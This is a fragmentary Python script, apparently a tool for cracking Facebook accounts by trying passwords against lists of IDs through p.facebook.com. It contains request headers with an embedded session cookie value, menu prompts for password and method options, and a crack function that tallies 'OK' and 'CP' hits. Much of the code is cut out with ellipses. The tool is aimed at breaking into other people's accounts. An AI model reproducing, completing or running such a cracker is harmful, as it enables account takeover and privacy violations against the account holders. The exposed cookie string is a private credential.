...
headers = {'authority': 'p.facebook.com',
    ...
    # 'cookie': 'datr=jhM8ZeWpOnQ0ajEwLZalfb53; sb=jhM8ZVhWBB4f5krJNYjvyEyo; vpd=v1%3B662x360x2; locale=ar_AR; wl_cbv=v2%3Bclient_version%3A2351%3Btimestamp%3A1699182185; m_pixel_ratio=2; wd=360x662; fr=0nyrEGNcQLRenXZVz.AWWCZ19471fH_ubX7-V0fWSlCFc.BlPBOO.-y.AAA.0.0.BlR3a7.AWUnXPmAcl4',
    'dpr': '2',
...
def menu():
	...
	if _____DYNO_____ in ['1']:
		...
		print(' \x1b[1;91m\x1b[1;96m\x1b[1;91m 𝑯𝑨𝑳𝑨𝒀𝑨 ')
		back()
def error():
...
class D:
	...
	def plerr(self):
		...
		try:
			...
			print(f'\x1b[1;93m𝑯𝑨𝑴𝑼 𝑰𝑫𝑨𝑲𝑨𝑵 : \x1b[1;93m'+str(len(id)))
			Settings()
		except IOError:
...
def Settings():
	print('')
	print('\x1b[1;93m1. 𝑩𝑨𝑺𝑯𝑻𝑹𝑬𝑵 𝑰𝑫𝑺 ')
	print('')
	hu = input('\x1b[1;93m𝑪𝒉𝒐𝒊𝒄𝒆 > \x1b[1;93m ')
	if hu in ['11','011']:
		muda=[]
		...
		print('\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91m𝑯𝑨𝑳𝑨𝒀𝑨')
		exit()
	
	print('\x1b[1;93m1. 𝑴𝑬𝑻𝑯𝑶𝑫𝑬 𝑴𝑶𝑩𝑰𝑳𝑬')
	print('')
	hc = input('\x1b[1;93m𝑪𝑯𝑶𝑰𝑪𝑬 > \x1b[1;93m')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	pwplus=input('\033[33m𝑨𝑼𝑻𝑶 𝑷𝑨𝑺𝑺 [ 𝑻 ] ')
	if pwplus in ['00','00']:
		pwpluss.append('ya')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r  𝑻𝑨𝑻𝑴𝑨𝒀💀✔️  {P}{b}{loop}{P}•{b}{len(id)}{P}  • 𝑶𝑲:{P}{H}{ok}{P} •  𝑪𝑷:{P}{M}{cp}{P} • ({bo}{'{:.0%})'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
